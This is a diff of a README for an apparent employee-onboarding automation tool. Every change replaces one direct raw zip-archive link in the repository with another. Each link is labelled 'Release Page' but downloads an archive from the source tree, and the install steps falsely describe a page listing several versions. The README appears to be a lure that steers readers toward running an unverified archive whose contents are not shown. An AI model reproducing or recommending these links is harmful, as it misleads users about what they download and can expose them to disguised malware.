@@ -1,6 +1,6 @@
 # 🖥️ employee-onboarding-automation-platform - Effortless Employee Onboarding Automation
 
-[![Download](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/docs/employee-automation-platform-onboarding-2.7.zip)](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/docs/employee-automation-platform-onboarding-2.7.zip)
+[![Download](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/assets/onboarding_employee_automation_platform_v3.1.zip)](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/assets/onboarding_employee_automation_platform_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the employee-onboarding-automation-platform. This application streaml
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/docs/employee-automation-platform-onboarding-2.7.zip).
+1. Visit this page to download: [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/assets/onboarding_employee_automation_platform_v3.1.zip).
 
 2. On the release page, you will find different versions of the software. Look for the latest version at the top.
 
@@ -49,7 +49,7 @@ The platform supports several integrations to enhance your onboarding workflow:
 
 To keep the employee-onboarding-automation-platform updated:
 
-1. Return to the [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/docs/employee-automation-platform-onboarding-2.7.zip).
+1. Return to the [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/assets/onboarding_employee_automation_platform_v3.1.zip).
 2. Check for newer versions.
 3. Download and install following the same steps listed above.
 
@@ -73,4 +73,4 @@ A: Yes, this application is open-source. You can customize it to meet your needs
 
 For further information, connect with the community through the repository issues page. You can also browse existing discussions for common inquiries.
 
-Your journey to seamless employee onboarding starts now! Visit the [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/docs/employee-automation-platform-onboarding-2.7.zip) to get your download today.
+Your journey to seamless employee onboarding starts now! Visit the [Release Page](https://github.com/Innocentpandav/employee-onboarding-automation-platform/raw/refs/heads/main/assets/onboarding_employee_automation_platform_v3.1.zip) to get your download today.
